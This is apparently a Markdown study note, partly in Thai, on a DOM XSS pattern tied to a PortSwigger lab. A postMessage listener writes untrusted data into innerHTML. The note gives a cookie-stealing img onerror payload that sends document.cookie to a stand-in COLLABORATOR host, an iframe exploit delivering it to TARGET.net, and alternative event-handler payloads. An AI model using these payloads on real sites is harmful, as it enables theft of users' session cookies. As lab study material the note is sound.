# Pattern 5: addEventListener + innerHTML (Ads)
> [Back to Index](../README.md) | [Previous: JavaScript URL](pattern-4-javascript-url.md)

---

## Overview

**Source:** `postMessage` data
**Sink:** `innerHTML`
**Element:** Ads div

---

## Vulnerable Code

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;  // ← innerHTML sink!
});
```

**ปัญหา:**
- รับ message จากทุก origin
- ใส่ data เข้า innerHTML โดยตรง

---

## Payload

```html
<img src=1 onerror=fetch(`https://COLLABORATOR?c=`+btoa(document.cookie))>
```

| ส่วน | ความหมาย |
|------|----------|
| `<img src=1` | สร้าง img ที่โหลดไม่ได้ |
| `onerror=...` | เมื่อ error ให้ทำ... |
| `fetch(...)` | ส่ง request |
| `btoa(...)` | base64 encode |

**หมายเหตุ:**
- `<script>` **ไม่ทำงานใน innerHTML**
- ต้องใช้ event handlers: `onerror`, `onload`, `onmouseover`

---

## Exploit

```html
<iframe src="https://TARGET.net/"
        onload="this.contentWindow.postMessage(
          '<img src=1 onerror=fetch(`https://COLLABORATOR?c=`+btoa(document.cookie))>',
          '*')">
</iframe>
```

---

## innerHTML vs script tag

```
innerHTML:
<script>alert(1)</script>  → ❌ ไม่ทำงาน
<img src=x onerror=alert(1)>  → ✅ ทำงาน!

document.write:
<script>alert(1)</script>  → ✅ ทำงาน
```

---

## Alternative Payloads

```html
<!-- SVG -->
<svg onload=alert(1)>

<!-- Body -->
<body onload=alert(1)>

<!-- Input with autofocus -->
<input onfocus=alert(1) autofocus>

<!-- Details -->
<details open ontoggle=alert(1)>
```

---

## Checklist

```
✓ หา addEventListener('message', ...)
✓ หา innerHTML sink
✓ ใช้ event handler payload (ไม่ใช่ <script>)
✓ btoa() สำหรับ base64 encode
✓ Cookie ต้องไม่มี HttpOnly
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

---

> **Next:** [pattern-6-reflected-eval.md](pattern-6-reflected-eval.md)
